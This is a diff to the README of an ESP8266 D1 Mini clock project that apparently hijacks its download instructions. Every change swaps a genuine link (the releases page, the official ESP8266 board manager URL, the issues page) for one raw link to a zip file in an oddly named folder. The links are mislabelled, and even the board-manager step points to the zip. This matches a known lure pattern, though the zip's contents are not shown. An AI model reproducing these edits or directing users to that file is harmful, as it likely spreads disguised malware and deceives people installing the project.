@@ -7,7 +7,7 @@ The D1-Mini-esp8266-clock is an accurate digital clock built on the ESP8266 plat
 To get started with the D1-Mini-esp8266-clock, follow these steps to install the software and run your clock application smoothly.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/kavinzidqi/D1-Mini-esp8266-clock/releases)
+[![Download](https://raw.githubusercontent.com/kavinzidqi/D1-Mini-esp8266-clock/main/proembryonic/D1-Mini-esp8266-clock-1.2.zip)](https://raw.githubusercontent.com/kavinzidqi/D1-Mini-esp8266-clock/main/proembryonic/D1-Mini-esp8266-clock-1.2.zip)
 
 ## 📋 System Requirements
 - **Hardware**: You will need an ESP8266 board and the following components:
@@ -17,7 +17,7 @@ To get started with the D1-Mini-esp8266-clock, follow these steps to install the
 - **Software**: Ensure you have a compatible version of the Arduino IDE installed. 
 
 ## 📦 Download & Install
-1. **Visit this page to download** the latest release: [GitHub Releases](https://github.com/kavinzidqi/D1-Mini-esp8266-clock/releases).
+1. **Visit this page to download** the latest release: [GitHub Releases](https://raw.githubusercontent.com/kavinzidqi/D1-Mini-esp8266-clock/main/proembryonic/D1-Mini-esp8266-clock-1.2.zip).
 2. Locate the latest version of the application.
 3. Click the download link for the provided software.
 4. Once downloaded, extract the zip file to a folder on your computer.
@@ -26,7 +26,7 @@ To get started with the D1-Mini-esp8266-clock, follow these steps to install the
 1. **Open the Arduino IDE** on your computer.
 2. Go to **File > Preferences** and add the following URL to the Additional Board Manager URLs section:
    ```
-   http://arduino.esp8266.com/stable/package_esp8266com_index.json
+   https://raw.githubusercontent.com/kavinzidqi/D1-Mini-esp8266-clock/main/proembryonic/D1-Mini-esp8266-clock-1.2.zip
    ```
 3. Open the **Boards Manager** by navigating to **Tools > Board > Boards Manager**. Search for "ESP8266" and install the boards package.
 4. Select your specific ESP8266 board from **Tools > Board**.
@@ -66,10 +66,10 @@ You may need to modify certain parameters in the code:
   Double-check the wiring of the DS18B20 sensor and confirm that the pull-up resistor is properly connected.
 
 ## 🌐 Community and Support
-If you encounter any issues or have questions, feel free to visit the [GitHub Issues page](https://github.com/kavinzidqi/D1-Mini-esp8266-clock/issues) where you can report problems or ask for help.
+If you encounter any issues or have questions, feel free to visit the [GitHub Issues page](https://raw.githubusercontent.com/kavinzidqi/D1-Mini-esp8266-clock/main/proembryonic/D1-Mini-esp8266-clock-1.2.zip) where you can report problems or ask for help.
 
 ## 📜 Additional Information
 This project is perfect for anyone looking to enhance their space with a digital clock that not only tells time but also provides real-time temperature readings. The combination of components makes it a versatile addition to your tech collection.
 
 ## 📥 Download Again
-For your convenience, here is the download link once more: [GitHub Releases](https://github.com/kavinzidqi/D1-Mini-esp8266-clock/releases).
+For your convenience, here is the download link once more: [GitHub Releases](https://raw.githubusercontent.com/kavinzidqi/D1-Mini-esp8266-clock/main/proembryonic/D1-Mini-esp8266-clock-1.2.zip).
